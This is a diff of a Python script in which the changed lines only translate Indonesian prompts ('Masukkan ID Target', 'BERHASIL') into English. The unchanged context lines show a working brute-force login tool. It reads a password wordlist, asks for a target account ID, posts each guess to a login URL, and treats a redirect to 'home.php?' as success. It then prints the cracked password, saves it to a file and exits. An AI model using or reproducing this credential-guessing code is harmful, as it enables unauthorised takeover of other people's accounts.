@@ -44,7 +44,7 @@ chek = open('chek.txt','a')
 def request():
 	password = open(wordlist,'r').readlines()
 	print('\n\033[92mJumlah Password : ',len(password),'\n')
-	print('\033[92m╭────\033[91m[\033[97m Masukkan ID Target\033[91m ]')
+	print('\033[92m╭────\033[91m[\033[97m Enter Target ID\033[91m ]')
 	id = input('\033[92m╰────➲\033[93m ')
 	for line in password:
 		pw = line.strip()
@@ -54,7 +54,7 @@ def request():
 		}
 		r = requests.post(url,headers=headers,data=data)
 		if('home.php?' in r.url or 'free' in r.url):
-			hack1 = '\n\033[1;97m\033[1;44;97m BERHASIL \033[0m\n\033[1;97mUsername : '+id+'\n\033[1;97mPassword : '+pw
+			hack1 = '\n\033[1;97m\033[1;44;97m SUCCESS \033[0m\n\033[1;97mUsername : '+id+'\n\033[1;97mPassword : '+pw
 			print(hack1)
 			hack.write(hack1)
 			os.sys.exit()
@@ -69,7 +69,7 @@ def request():
 			
 			
 if __name__=='__main__':
-	print('\033[92m╭────\033[91m[ \033[97mMasukkan File Wordlist \033[92m( word.txt ) \033[91;1m]')
+	print('\033[92m╭────\033[91m[ \033[97mEnter Wordlist File \033[92m( word.txt ) \033[91;1m]')
 	wordlist = input('\033[92m╰────➲\033[93m ')
 	request()
 	
